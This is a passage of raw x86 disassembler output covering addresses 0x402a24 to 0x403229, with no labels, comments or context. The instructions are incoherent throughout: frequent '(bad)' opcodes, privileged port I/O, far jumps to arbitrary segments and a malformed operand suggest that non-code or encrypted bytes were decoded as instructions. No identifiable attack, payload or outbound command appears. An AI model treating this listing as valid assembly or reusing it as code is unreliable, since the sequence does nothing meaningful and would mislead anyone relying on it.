  402a24:	pop    ds
  402a25:	addr16 mov dh,0xd6
  402a28:	sahf   
  402a29:	pushf  
  402a2a:	int3   
  402a2b:	in     al,dx
  402a2c:	jnp    0x4029b6
  402a2e:	test   al,0x5b
  402a30:	loopne 0x4029c4
  402a32:	es adc eax,0x66c1a34c
  402a38:	mov    edi,0xd4e05a8a
  402a3d:	shr    DWORD PTR [edx+ebx*1],1
  402a40:	mov    edi,0x45f26785
  402a45:	jae    0x402a0a
  402a47:	das    
  402a48:	inc    edx
  402a49:	sbb    eax,0xcc5a261e
  402a4e:	out    0xc0,eax
  402a50:	test   al,0x92
  402a52:	les    eax,FWORD PTR [ecx]
  402a54:	xchg   edi,eax
  402a55:	sub    DWORD PTR [eax+ecx*1+0x7923ac7c],edx
  402a5c:	add    al,0x5a
  402a5e:	sub    BYTE PTR [esi-0x4f],dl
  402a61:	inc    edi
  402a62:	cmp    eax,0xa673dbb3
  402a67:	arpl   WORD PTR [ecx+0x58a7d604],bx
  402a6d:	test   DWORD PTR [eax-0x17],ecx
  402a70:	fist   WORD PTR [esi+0x51]
  402a73:	pop    ebp
  402a74:	and    edx,0x90ff7a18
  402a7a:	jmp    0x402a14
  402a7c:	xchg   esp,eax
  402a7d:	(bad)  
  402a7e:	sub    edx,DWORD PTR [edx+0x30]
  402a81:	pop    ebp
  402a82:	mov    edx,0x79b86f07
  402a87:	inc    edi
  402a88:	jmp    DWORD PTR [ecx-0x4ed0eb0f]
  402a8e:	(bad)  
  402a8f:	out    0x41,al
  402a91:	push   ebp
  402a92:	test   al,0x5f
  402a94:	mov    esi,0x25360bea
  402a99:	call   0x47d46c2b
  402a9e:	loopne 0x402a89
  402aa0:	ds call 0x99036657
  402aa6:	(bad)
  402aaa:	je     0x402a4d
  402aac:	repz (bad) 
  402aae:	bnd jp 0x402aa7
  402ab1:	aaa    
  402ab2:	pop    eax
  402ab3:	adc    bl,ch
  402ab5:	adc    eax,0x8569af27
  402aba:	push   eax
  402abb:	rcl    BYTE PTR [eax+0x41ac3c42],0xfa
  402ac2:	mov    esi,0xa764dc32
  402ac7:	inc    ecx
  402ac8:	adc    DWORD PTR [edx],0xc598ea97
  402ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402acf:	dec    eax
  402ad0:	xchg   esi,eax
  402ad1:	dec    ebx
  402ad2:	mov    ah,0x7b
  402ad4:	sbb    eax,0x1614da0e
  402ad9:	xor    dl,BYTE PTR [edx+0x19b93075]
  402adf:	mov    eax,ss
  402ae1:	and    BYTE PTR [edx-0x20],0x4f
  402ae5:	push   ds
  402ae6:	inc    esi
  402ae7:	sub    DWORD PTR [esi+0x5b],0x15e2611a
  402aee:	fst    st(6)
  402af0:	sub    edi,esi
  402af2:	add    DWORD PTR [esi],ebx
  402af4:	jne    0x402a96
  402af6:	sub    esp,eax
  402af8:	imul   ebx,DWORD PTR [ecx+eiz*1],0xa161dc83
  402aff:	xor    BYTE PTR [ebx],0x94
  402b02:	push   edi
  402b03:	pop    ss
  402b04:	sbb    DWORD PTR [esi],esp
  402b06:	mov    esi,0x3551ec2c
  402b0b:	xor    al,0xed
  402b0d:	xor    DWORD PTR [eax-0x187ca496],ebx
  402b13:	adc    dl,BYTE PTR [edx+edi*8]
  402b16:	int    0x4d
  402b18:	xor    ecx,DWORD PTR [edx-0x1e0ec522]
  402b1e:	bound  edx,QWORD PTR [ecx+0x7549e69d]
  402b24:	mov    al,0xd1
  402b26:	sbb    ebp,DWORD PTR [edi+eiz*1]
  402b29:	or     ah,BYTE PTR ds:0xf1cd54a0
  402b2f:	xchg   BYTE PTR [edx+0x7f41d335],dh
  402b35:	xchg   ebx,eax
  402b36:	or     bh,BYTE PTR [eax-0x39cb30ba]
  402b3c:	or     bh,BYTE PTR [ecx+0x76]
  402b3f:	jns    0x402b36
  402b41:	cmp    cl,BYTE PTR [edx+0x48]
  402b44:	test   BYTE PTR [ebp-0x3c74e1e5],bl
  402b4a:	mov    eax,0x5af4c607
  402b4f:	cwde   
  402b50:	mov    al,0xd5
  402b52:	hlt    
  402b53:	add    edx,DWORD PTR [ecx+0x45922b3c]
  402b59:	aas    
  402b5a:	mov    al,BYTE PTR [ecx+0x5f1c4019]
  402b60:	mov    esp,0x44753485
  402b65:	call   0x55e437c5
  402b6a:	into   
  402b6b:	xchg   al,ah
  402b6d:	dec    ecx
  402b6e:	retf   0xde6
  402b71:	shl    DWORD PTR [ebp+0x6b],cl
  402b74:	sbb    al,0x61
  402b76:	js     0x402b9b
  402b78:	push   esp
  402b79:	or     ebx,0x5b4c8f03
  402b7f:	or     ch,bh
  402b81:	retf   0x3b15
  402b84:	fsubp  st(0),st
  402b86:	mov    ds:0x14fe8fc3,eax
  402b8b:	dec    ebx
  402b8c:	xchg   ebp,eax
  402b8d:	jno    0x402ba7
  402b8f:	lds    eax,FWORD PTR [edx]
  402b91:	leave  
  402b92:	dec    edi
  402b93:	pop    edx
  402b94:	or     bl,bl
  402b96:	mov    ds:0xf95c02f0,al
  402b9b:	pop    ebp
  402b9c:	cmp    eax,0x26b7ef40
  402ba1:	stc    
  402ba2:	ins    BYTE PTR es:[edi],dx
  402ba3:	jae    0x402b63
  402ba5:	pop    edx
  402ba6:	dec    esp
  402ba7:	pusha  
  402ba8:	daa    
  402ba9:	ret    
  402baa:	dec    esp
  402bab:	paddw  mm1,QWORD PTR [esi]
  402bae:	enter  0x918f,0xe3
  402bb2:	sbb    al,0xb5
  402bb4:	push   ds
  402bb5:	fs andnps xmm6,xmm6
  402bb9:	xor    eax,0x21751a44
  402bbe:	xchg   esi,eax
  402bbf:	lds    eax,FWORD PTR [ecx]
  402bc1:	ds jecxz 0x402bbb
  402bc4:	(bad)  
  402bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc6:	mov    cl,0x78
  402bc8:	fst    DWORD PTR [edx]
  402bca:	aas    
  402bcb:	clc    
  402bcc:	xchg   DWORD PTR [eax],esi
  402bce:	fadd   DWORD PTR [ebx]
  402bd0:	mov    ds:0x60f1094f,al
  402bd5:	arpl   cx,si
  402bd7:	es cmp eax,0x3d2c4a0e
  402bdd:	fidiv  WORD PTR [esi]
  402bdf:	cs pop ds
  402be1:	and    BYTE PTR [ebp+0x2d22497b],ah
  402be7:	stc    
  402be8:	scas   al,BYTE PTR es:[edi]
  402be9:	(bad)  
  402bea:	arpl   WORD PTR [esi+0x3b3ebd2b],bp
  402bf0:	adc    eax,0x12bb98c7
  402bf5:	mov    edi,0x5c3d2036
  402bfa:	popf   
  402bfb:	mov    ecx,0x5b64c17f
  402c00:	fdivr  DWORD PTR [esi+ecx*1-0x37]
  402c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c05:	mov    ds,WORD PTR [ebx]
  402c07:	mov    dl,0x49
  402c09:	add    BYTE PTR [ebx+0x29],dh
  402c0c:	adc    al,0xa4
  402c0e:	adc    eax,0x46fb957a
  402c13:	(bad)  
  402c14:	call   0x4becc4b8
  402c19:	push   0xa6ddec01
  402c1e:	mov    fs,WORD PTR [ebp+0x220ae71]
  402c24:	add    DWORD PTR [edi+0xa],eax
  402c27:	arpl   WORD PTR [eax-0x217844dd],bp
  402c2d:	adc    esi,DWORD PTR [edi-0x31]
  402c30:	out    0x1f,al
  402c32:	mov    edx,0x66b89cdf
  402c37:	neg    DWORD PTR [esi]
  402c39:	(bad)  
  402c3a:	push   ebp
  402c3b:	mov    ds:0xa2716d0b,eax
  402c40:	aaa    
  402c41:	xchg   ecx,eax
  402c42:	cwde   
  402c43:	add    ebp,edi
  402c45:	aas    
  402c46:	iret   
  402c47:	jmp    0x97ea:0x450336b
  402c4e:	or     eax,0x604e9217
  402c53:	mov    cl,0x9d
  402c55:	jle    0x402beb
  402c57:	sbb    bl,ch
  402c59:	ja     0x402c97
  402c5b:	jl     0x402c76
  402c5d:	popa   
  402c5e:	or     BYTE PTR [ecx+0x3066d93a],al
  402c64:	xchg   ebx,eax
  402c65:	out    0x74,al
  402c67:	and    al,0xc1
  402c69:	out    dx,al
  402c6a:	popa   
  402c6b:	mov    ebx,0x8620a912
  402c70:	popa   
  402c71:	arpl   WORD PTR ds:[ebp+0x2b],si
  402c75:	imul   ebx,DWORD PTR [edi],0x3d
  402c78:	icebp  
  402c79:	fwait
  402c7a:	sub    eax,0xaf1e65d2
  402c7f:	push   ds
  402c80:	adc    BYTE PTR [edi+edx*1+0x153624c9],0x66
  402c88:	aaa    
  402c89:	xchg   ebp,eax
  402c8a:	cld    
  402c8b:	push   ebx
  402c8c:	adc    BYTE PTR [edx-0x2c79910c],ch
  402c92:	inc    eax
  402c93:	(bad)  
  402c94:	outs   dx,BYTE PTR ds:[esi]
  402c95:	sub    DWORD PTR [eax-0x7dcb7632],ebp
  402c9b:	mov    bh,0xe8
  402c9d:	outs   dx,DWORD PTR ds:[esi]
  402c9e:	js     0x402d1f
  402ca0:	outs   dx,DWORD PTR ds:[esi]
  402ca1:	(bad)  
  402ca2:	adc    BYTE PTR [ebx+0x3a59d44e],bh
  402ca8:	and    al,0x5b
  402caa:	push   es
  402cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cac:	inc    eax
  402cad:	pop    ebx
  402cae:	mov    DWORD PTR [ecx+0x120f2ac2],ebp
  402cb4:	inc    esp
  402cb5:	in     al,0xa8
  402cb7:	psubb  mm1,mm7
  402cba:	imul   ecx,DWORD PTR [ebx+0xc],0xdc9e1a27
  402cc1:	mov    esp,0xb74defe5
  402cc6:	stos   DWORD PTR es:[edi],eax
  402cc7:	mov    esi,0xd0936eef
  402ccc:	hlt    
  402ccd:	daa    
  402cce:	je     0x402cd4
  402cd0:	jbe    0x402cef
  402cd2:	or     DWORD PTR [ebx+0x13081401],ebx
  402cd8:	ja     0x402c78
  402cda:	popf   
  402cdb:	jmp    0x402d02
  402cdd:	lods   eax,DWORD PTR ds:[esi]
  402cde:	mov    dh,0x8c
  402ce0:	add    dh,BYTE PTR [ebp*2+0x47333f6b]
  402ce7:	out    0x51,al
  402ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cea:	jge    0x402d57
  402cec:	mov    cl,0x61
  402cee:	fdivr  QWORD PTR [esi+0x6ce9eb02]
  402cf4:	(bad)  
  402cf5:	(bad)  
  402cf6:	sub    bh,BYTE PTR [edx]
  402cf8:	loopne 0x402d64
  402cfa:	push   0x3f5b0466
  402cff:	lock mov al,BYTE PTR [edx-0x206c2317]
  402d06:	dec    ebp
  402d07:	adc    dl,BYTE PTR [edx+0x2c]
  402d0a:	inc    edi
  402d0b:	push   ebx
  402d0c:	or     BYTE PTR [edx+0x47],dl
  402d0f:	cwde   
  402d10:	and    eax,esi
  402d12:	xchg   edx,eax
  402d13:	pusha  
  402d14:	rcl    DWORD PTR [edi+0x6becc54a],0x65
  402d1b:	or     eax,0xb77e250f
  402d20:	mov    cl,0x65
  402d22:	and    ch,ch
  402d24:	add    ecx,DWORD PTR [eax-0x2fb5e8a2]
  402d2a:	mov    dh,0xfb
  402d2c:	loope  0x402cd5
  402d2e:	mov    dh,0x41
  402d30:	and    eax,0x91d56fcc
  402d35:	sbb    BYTE PTR [edx-0x642707f1],al
  402d3b:	call   0xd1bc86cf
  402d40:	sub    BYTE PTR ds:0xd3ceb693,dl
  402d46:	bound  ecx,QWORD PTR ds:0x8803de3f
  402d4c:	fstp   TBYTE PTR [ebp+ecx*1+0x4c]
  402d50:	jno    0x402d33
  402d52:	and    bl,BYTE PTR [eax-0x445ce949]
  402d58:	or     DWORD PTR [ecx-0x79],ebx
  402d5b:	js     0x402dcd
  402d5d:	sbb    BYTE PTR [edx],bh
  402d5f:	xor    bl,BYTE PTR fs:[ecx]
  402d62:	inc    esp
  402d63:	or     BYTE PTR [esi],al
  402d65:	cwde   
  402d66:	les    ebx,FWORD PTR [ebx+0x55]
  402d69:	(bad)  
  402d6a:	cli    
  402d6b:	pop    edi
  402d6c:	push   esi
  402d6d:	cwde   
  402d6e:	mov    ebp,0x261884f3
  402d73:	inc    ebp
  402d74:	ficom  WORD PTR [ebx]
  402d76:	cmp    cl,BYTE PTR [ebp+0x4]
  402d79:	or     ah,BYTE PTR [edi]
  402d7b:	push   ebp
  402d7c:	test   BYTE PTR [ecx],dl
  402d7e:	in     al,dx
  402d7f:	repnz xor DWORD PTR [edi],ebx
  402d82:	cwde   
  402d83:	pop    es
  402d84:	dec    edx
  402d85:	imul   esi,esp,0xffffff86
  402d88:	cmc    
  402d89:	aaa    
  402d8a:	mov    ds:0x73ccaf1a,al
  402d8f:	cmp    al,BYTE PTR [edx+0x5b]
  402d92:	push   esi
  402d93:	stc    
  402d94:	ins    BYTE PTR es:[edi],dx
  402d95:	jmp    0x7acf9094
  402d9a:	mov    bh,0xea
  402d9c:	xchg   edi,eax
  402d9d:	or     DWORD PTR [esi+0x1c86bbf8],0x23
  402da4:	addr16 push cs
  402da6:	mov    ch,BYTE PTR [esi]
  402da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da9:	ja     0x402d74
  402dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dac:	repnz inc ecx
  402dae:	dec    edx
  402daf:	sub    edi,DWORD PTR [eax+0x1373b0a6]
  402db5:	fstp   TBYTE PTR ds:0xa40347ee
  402dbb:	les    ebx,FWORD PTR [edx-0x73]
  402dbe:	jno    0x402e0a
  402dc0:	sbb    eax,0x5f4833cb
  402dc5:	and    BYTE PTR ds:0x81ccdf6f,ch
  402dcb:	stc    
  402dcc:	cdq    
  402dcd:	shl    DWORD PTR [esi+0x4770934],1
  402dd3:	mov    esp,0x79243c04
  402dd8:	push   eax
  402dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dda:	into   
  402ddb:	rep lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dde:	xchg   edx,eax
  402ddf:	mov    ch,BYTE PTR [edi]
  402de1:	lods   al,BYTE PTR ds:[esi]
  402de2:	lock xor BYTE PTR [ebp+0x2089eddc],ah
  402de9:	pusha  
  402dea:	push   ecx
  402deb:	push   edx
  402dec:	test   al,0xd1
  402dee:	mov    bh,0xb9
  402df0:	push   edi
  402df1:	mov    ebp,0x99c678d7
  402df6:	xor    DWORD PTR [ebx-0x3f],eax
  402df9:	mov    al,ds:0xa0426fd1
  402dfe:	jg     0x402de5
  402e00:	(bad)  
  402e01:	push   ecx
  402e02:	push   0xbe594720
  402e07:	xchg   edx,eax
  402e08:	push   edx
  402e09:	sbb    eax,DWORD PTR [ebp-0x22fb618c]
  402e0f:	int3   
  402e10:	dec    edi
  402e11:	and    al,0xad
  402e13:	sbb    DWORD PTR [esi+0x2689b14b],edi
  402e19:	pop    es
  402e1a:	pop    ebx
  402e1b:	jb     0x402e4c
  402e1d:	out    dx,al
  402e1e:	pop    es
  402e1f:	xor    eax,0xcaba9ad2
  402e24:	pop    esp
  402e25:	pop    ecx
  402e26:	mov    bh,dl
  402e28:	add    cl,BYTE PTR [ebx]
  402e2a:	inc    esp
  402e2b:	pushf  
  402e2c:	xchg   edi,eax
  402e2d:	jl     0x402e71
  402e2f:	shr    BYTE PTR [edx+0x31956e0b],cl
  402e35:	sbb    al,0xf8
  402e37:	mov    BYTE PTR [ecx+0x2d369526],ah
  402e3d:	sahf   
  402e3e:	mov    BYTE PTR [edx-0x1b],al
  402e41:	cdq    
  402e42:	mov    cl,0xd6
  402e44:	aam    0x6b
  402e46:	fidivr WORD PTR [ebp-0x3b]
  402e49:	and    DWORD PTR [edx],esi
  402e4b:	xchg   BYTE PTR [edi+0x21a68da8],ch
  402e51:	jb     0x402e0c
  402e53:	cld    
  402e54:	sbb    ah,al
  402e56:	arpl   WORD PTR [ecx+0x26],bx
  402e59:	xchg   esp,eax
  402e5a:	xor    eax,esp
  402e5c:	aam    0x7e
  402e5e:	or     al,0x3b
  402e60:	sub    bh,BYTE PTR [ebx-0x35]
  402e63:	js     0x402ec0
  402e65:	cmp    edi,edi
  402e67:	dec    ebx
  402e68:	and    ch,BYTE PTR [esp+esi*1-0x1d]
  402e6c:	add    DWORD PTR [ecx+0x15d09859],esp
  402e72:	pop    edi
  402e73:	xor    dl,BYTE PTR [ebx-0xf62b00c]
  402e79:	push   esi
  402e7a:	mov    WORD PTR [ebx+0x6c],ss
  402e7d:	retf   
  402e7e:	add    eax,0x3aec0382
  402e83:	fs hlt 
  402e85:	pop    cx
  402e87:	sti    
  402e88:	les    eax,FWORD PTR [edx-0x15d28167]
  402e8e:	pop    edi
  402e8f:	lods   al,BYTE PTR ds:[esi]
  402e90:	aas    
  402e91:	int    0xc8
  402e93:	push   edi
  402e94:	imul   edi,ecx,0xfde823ed
  402e9a:	in     al,0x22
  402e9c:	scas   eax,DWORD PTR es:[di]
  402e9e:	test   eax,0xbd8f0e47
  402ea3:	nop
  402ea4:	mov    bh,0xac
  402ea6:	cmp    ecx,ebx
  402ea8:	test   eax,0xfd13e56c
  402ead:	xor    DWORD PTR [edx+0x6d9c195c],eax
  402eb3:	cwde   
  402eb4:	jne    0x402e3f
  402eb6:	stos   DWORD PTR es:[edi],eax
  402eb7:	xchg   edx,eax
  402eb8:	in     eax,dx
  402eb9:	adc    edx,ebp
  402ebb:	fnsave [esi+0x2d]
  402ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebf:	or     BYTE PTR [esi+eiz*2-0x36],ch
  402ec3:	jnp    0x402ec6
  402ec5:	stos   DWORD PTR es:[edi],eax
  402ec6:	icebp  
  402ec7:	dec    ecx
  402ec8:	loope  0x402e4c
  402eca:	dec    ebp
  402ecb:	adc    al,0xbf
  402ecd:	push   ebx
  402ece:	and    ebp,DWORD PTR [ebx-0x6d]
  402ed1:	fdivr  st,st(0)
  402ed3:	(bad)  
  402ed4:	push   ebp
  402ed5:	(bad)  
  402ed6:	cmp    BYTE PTR [ebp-0x67],bh
  402ed9:	fs dec ebx
  402edb:	inc    esp
  402edc:	push   edi
  402edd:	jecxz  0x402e70
  402edf:	push   esi
  402ee0:	aas    
  402ee1:	aaa    
  402ee2:	out    dx,al
  402ee3:	pushf  
  402ee4:	fiadd  WORD PTR [eax-0x67c6237]
  402eea:	jae    0x402ed2
  402eec:	(bad)  
  402eed:	stos   DWORD PTR es:[edi],eax
  402eee:	push   edx
  402eef:	push   esi
  402ef0:	adc    al,0xf3
  402ef2:	sar    DWORD PTR [edi+0x2303bd23],1
  402ef8:	mov    dh,0xb7
  402efa:	sub    DWORD PTR [ecx+eax*1+0x7353fd79],edx
  402f01:	lea    ebp,[ecx-0x75]
  402f04:	mov    esp,0xe49ca613
  402f09:	jl     0x402ef4
  402f0b:	mov    bh,0x39
  402f0d:	loopne 0x402eb9
  402f0f:	stos   BYTE PTR es:[edi],al
  402f10:	mov    ds:0x296a40dc,al
  402f15:	jae    0x402f42
  402f17:	ret    0xd883
  402f1a:	dec    edx
  402f1b:	jmp    0x8dac:0x78a3fc90
  402f22:	add    eax,0x9d3cf6d1
  402f27:	add    eax,ebx
  402f29:	push   edx
  402f2a:	pusha  
  402f2b:	(bad)  
  402f2c:	bound  eax,QWORD PTR [esp+eiz*2-0x28371bd1]
  402f33:	les    edx,FWORD PTR [ecx-0x4f]
  402f36:	xchg   edi,eax
  402f37:	imul   eax,eax,0x7f3f65b0
  402f3d:	xchg   edi,eax
  402f3e:	jle    0x402f4e
  402f40:	arpl   WORD PTR ds:0x39d4f27f,cx
  402f46:	xchg   esp,eax
  402f47:	lods   al,BYTE PTR ds:[esi]
  402f48:	into   
  402f49:	cmp    DWORD PTR [edi+0x35d47ad],0x4f
  402f50:	lea    edi,[esi-0x4d]
  402f53:	cmp    eax,0xc0dc2dae
  402f58:	push   edi
  402f59:	cmc    
  402f5a:	cmp    eax,DWORD PTR [ebx+0x71ea0cf]
  402f60:	rol    ebp,0x8e
  402f63:	test   eax,0x88b34881
  402f68:	pop    ds
  402f69:	sbb    eax,0xf52587c
  402f6e:	or     BYTE PTR [eax],ch
  402f70:	call   0x18aa7c8
  402f75:	fistp  WORD PTR ds:0xb9b0cb72
  402f7b:	cmp    BYTE PTR [di-0x753c],ch
  402f80:	cmp    al,0x2e
  402f82:	mov    ecx,0x25e6852e
  402f87:	add    al,BYTE PTR [esi+ebx*2-0x2d4e0e25]
  402f8e:	imul   esi,ecx,0xffffffbd
  402f91:	mov    ebx,0x74f30b7e
  402f96:	in     al,dx
  402f97:	xchg   ecx,eax
  402f98:	out    0xdf,al
  402f9a:	mov    dh,0x71
  402f9c:	mov    ebp,0xf3fb2c07
  402fa1:	sahf   
  402fa2:	test   BYTE PTR [eax+0x435ed6c4],cl
  402fa8:	ror    DWORD PTR [ebp+0x24],1
  402fab:	in     al,0xa9
  402fad:	mov    ebx,0xf8d1accd
  402fb2:	and    eax,DWORD PTR [ebp+0x74]
  402fb5:	push   ss
  402fb6:	adc    BYTE PTR [edi],bl
  402fb8:	mov    al,ds:0xf9a57916
  402fbd:	out    dx,eax
  402fbe:	cs call 0xbc33d844
  402fc4:	fs jnp 0x403045
  402fc7:	(bad)  [ebx-0x53]
  402fca:	pop    ebx
  402fcb:	cmp    ch,bl
  402fcd:	adc    al,0x23
  402fcf:	fs sbb eax,0x3dd7d798
  402fd5:	pop    ebx
  402fd6:	out    dx,eax
  402fd7:	mov    WORD PTR ds:0xa5d6eb64,ss
  402fdd:	mov    al,0x59
  402fdf:	adc    di,WORD PTR ds:0x4762a087
  402fe6:	cmp    DWORD PTR [edx+0x5],ecx
  402fe9:	adc    ecx,ebx
  402feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fec:	adc    al,0x61
  402fee:	lea    ebx,[ebp-0x46]
  402ff1:	fcom   DWORD PTR [edi]
  402ff3:	xchg   ebx,eax
  402ff4:	mov    cl,0x6
  402ff6:	and    ah,0x59
  402ff9:	int    0x1
  402ffb:	sub    eax,0x8c7abfb0
  403000:	inc    ecx
  403001:	mov    ebx,0x59ee2e92
  403006:	sbb    edi,DWORD PTR [ebx-0x7f8cf298]
  40300c:	adc    DWORD PTR [esi+0x656c33a0],0xfffffffc
  403013:	mov    ebx,?
  403015:	enter  0x4e0,0x35
  403019:	in     eax,dx
  40301a:	mov    edx,0x8c063bf3
  40301f:	fidiv  DWORD PTR [esi]
  403021:	push   0x3b01b6d0
  403026:	bnd ret 0x79ed
  40302a:	pop    ss
  40302b:	je     0x403061
  40302d:	jecxz  0x40308c
  40302f:	mov    ds,WORD PTR ds:0x91c7377b
  403035:	and    DWORD PTR [ebx+0x4d],esi
  403038:	shr    DWORD PTR [eax+0x66],0xb4
  40303c:	lock add eax,0x9f5b4932
  403042:	cmp    DWORD PTR [ebp-0x48],ecx
  403045:	sahf   
  403046:	(bad)  
  403047:	addr16 push 0x2b59175f
  40304d:	mov    eax,ds:0x65f407d4
  403052:	cmp    eax,0x74b5d39a
  403057:	imul   ebp,DWORD PTR [edi-0x62d0c237],0x892ae7d2
  403061:	sar    DWORD PTR ds:0x9d050f1d,cl
  403067:	or     ecx,DWORD PTR [ecx-0x9]
  40306a:	and    bl,BYTE PTR [esi-0x52]
  40306d:	add    ebp,ecx
  40306f:	pop    esi
  403070:	and    al,0x4
  403072:	test   DWORD PTR [eax+ebx*1-0x7227a22],0x9ef6c31d
  40307d:	fstp   QWORD PTR [ecx]
  40307f:	pop    ebp
  403080:	popa   
  403081:	jae    0x4030f4
  403083:	lods   al,BYTE PTR ds:[esi]
  403084:	aam    0x28
  403086:	popa   
  403087:	cmp    al,0xfc
  403089:	cmp    ecx,DWORD PTR [ecx]
  40308b:	(bad)  
  40308c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40308d:	dec    edx
  40308e:	scas   eax,DWORD PTR es:[edi]
  40308f:	mov    dh,0x98
  403091:	dec    esi
  403092:	pop    edi
  403093:	lock mov ebx,0xfc962ee
  403099:	fstp   TBYTE PTR [eax*4-0x37581e3f]
  4030a0:	lahf   
  4030a1:	mov    edx,0x7da0daff
  4030a6:	and    ecx,ebp
  4030a8:	aad    0x87
  4030aa:	pop    ebx
  4030ab:	imul   edi,ebx,0xa5a80101
  4030b1:	push   esi
  4030b2:	xor    DWORD PTR [edx-0x4],eax
  4030b5:	inc    BYTE PTR [ecx]
  4030b7:	push   esp
  4030b8:	jno    0x40306b
  4030ba:	fadd   st,st(7)
  4030bc:	lea    ecx,[ecx+0x16]
  4030bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c0:	fadd   QWORD PTR [eax-0x240ac387]
  4030c6:	mov    eax,ds:0xc4d9d4a2
  4030cb:	add    eax,0x119c63a1
  4030d0:	jno    0x40309c
  4030d2:	mul    al
  4030d4:	cmp    BYTE PTR ss:[edi+esi*1-0xd],ah
  4030d9:	pusha  
  4030da:	jmp    0x561ae720
  4030df:	icebp  
  4030e0:	or     eax,0xfb8f7155
  4030e5:	sbb    dh,BYTE PTR [edx-0x31]
  4030e8:	lods   al,BYTE PTR ds:[esi]
  4030e9:	mov    al,0x51
  4030eb:	or     bl,BYTE PTR [ebx-0x494e464b]
  4030f1:	pop    ebx
  4030f2:	mov    eax,ds:0x38bf3fa2
  4030f7:	cdq    
  4030f8:	(bad)  
  4030f9:	push   ebp
  4030fa:	aaa    
  4030fb:	push   ds
  4030fc:	(bad)  
  4030fe:	scas   al,BYTE PTR es:[edi]
  4030ff:	shr    BYTE PTR [esi-0x66],1
  403102:	loope  0x403151
  403104:	test   DWORD PTR [ecx-0x6aad01cc],ebp
  40310a:	sub    BYTE PTR [esi-0x23799672],al
  403110:	cmp    dh,bl
  403112:	lods   eax,DWORD PTR ds:[esi]
  403113:	call   0x7469:0xc7d2f494
  40311a:	or     ecx,edx
  40311c:	push   ds
  40311d:	jmp    0xb8a3:0xac9d1f5
  403124:	mov    BYTE PTR [ebx-0x36],dl
  403127:	xor    BYTE PTR [edx+0x4a],bh
  40312a:	ins    BYTE PTR es:[edi],dx
  40312b:	xlat   BYTE PTR ds:[ebx]
  40312c:	(bad)  
  40312d:	pop    ecx
  40312e:	mov    ds:0x9671a66f,al
  403133:	stc    
  403134:	or     eax,0x9871d4f2
  403139:	mov    ch,0xf5
  40313b:	mov    edx,0x8f25e4ad
  403140:	mov    dh,0xc
  403142:	fincstp 
  403144:	pusha  
  403145:	or     dh,BYTE PTR [eax]
  403147:	bound  ebx,QWORD PTR [edx+eax*8+0x12]
  40314b:	in     eax,dx
  40314c:	mov    WORD PTR [esi],es
  40314e:	ins    DWORD PTR es:[edi],dx
  40314f:	retf   0xf596
  403152:	sbb    BYTE PTR [ebx+0x15],al
  403155:	div    BYTE PTR [ebp-0x6e96440e]
  40315b:	sti    
  40315c:	popa   
  40315d:	and    dh,BYTE PTR [ebx]
  40315f:	inc    esi
  403160:	(bad)  
  403161:	mov    dh,0xc3
  403163:	xchg   DWORD PTR [ecx],eax
  403165:	outs   dx,DWORD PTR ds:[esi]
  403166:	ss bnd jmp 0x72cc0e06
  40316d:	cld    
  40316e:	pop    eax
  40316f:	sahf   
  403170:	shr    DWORD PTR [ecx],1
  403172:	das    
  403173:	xchg   esp,eax
  403174:	jecxz  0x40314c
  403176:	loop   0x403164
  403178:	stos   DWORD PTR es:[edi],eax
  403179:	imul   ecx,DWORD PTR [esi+ebx*2+0x63918c03],0xffffffbb
  403181:	ins    DWORD PTR es:[edi],dx
  403182:	ins    DWORD PTR es:[edi],dx
  403183:	(bad)  
  403184:	pop    ecx
  403185:	jmp    0x4a03a20d
  40318a:	pop    esp
  40318b:	mov    al,0x71
  40318d:	inc    edx
  40318e:	jmp    0x50ad:0x9f75ec6
  403195:	inc    ebp
  403196:	stos   BYTE PTR es:[edi],al
  403197:	fwait
  403198:	dec    ebx
  403199:	arpl   WORD PTR ds:0x2bdc5816,sp
  40319f:	sbb    ch,BYTE PTR [edx]
  4031a1:	mov    edx,0x7cdbb553
  4031a6:	xor    edi,DWORD PTR [eax+0x54]
  4031a9:	xor    DWORD PTR [eax-0x620a232e],edi
  4031af:	shl    DWORD PTR [eax-0x8],0x40
  4031b3:	(bad)  
  4031b4:	jle    0x4031b6
  4031b6:	jns    0x4031cf
  4031b8:	cwde   
  4031b9:	out    0x66,al
  4031bb:	ret    0x4408
  4031be:	(bad)  
  4031bf:	setns  BYTE PTR [esi-0x5a]
  4031c3:	imul   ebx,DWORD PTR ds:[eax*8-0x527df559],0xffffffbb
  4031cc:	or     BYTE PTR [eax+edx*4],bl
  4031cf:	(bad)  
  4031d0:	dec    ebx
  4031d1:	gs call 0xb585:0x37b83717
  4031d9:	mov    BYTE PTR [eax-0x76],bh
  4031dc:	jge    0x40320a
  4031de:	jl     0x40325b
  4031e0:	arpl   WORD PTR [esi+0x101e32c4],bx
  4031e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e7:	pop    edi
  4031e8:	inc    esi
  4031e9:	jecxz  0x40321f
  4031eb:	pushf  
  4031ec:	jmp    0x403236
  4031ee:	mov    dh,0x32
  4031f0:	ins    BYTE PTR es:[edi],dx
  4031f1:	jmp    0xaa20:0xcbe04ef0
  4031f8:	jo     0x4031a4
  4031fa:	adc    DWORD PTR [ecx+0x155799b2],ebx
  403200:	int    0xc8
  403202:	push   ecx
  403203:	pop    esp
  403204:	jmp    0xa223:0x11649222
  40320b:	push   0x8da7b9f1
  403210:	loop   0x40322c
  403212:	call   0x3327fb49
  403217:	movzx  esp,WORD PTR [ebp+0x4b]
  40321b:	add    al,0x26
  40321d:	pop    ebx
  40321e:	xchg   edi,eax
  40321f:	mov    ecx,0x8e58d814
  403224:	pop    es
  403225:	std    
  403226:	sbb    dl,BYTE PTR [edx]
  403228:	into   
  403229:	scas   eax,DWORD PTR es:[edi]
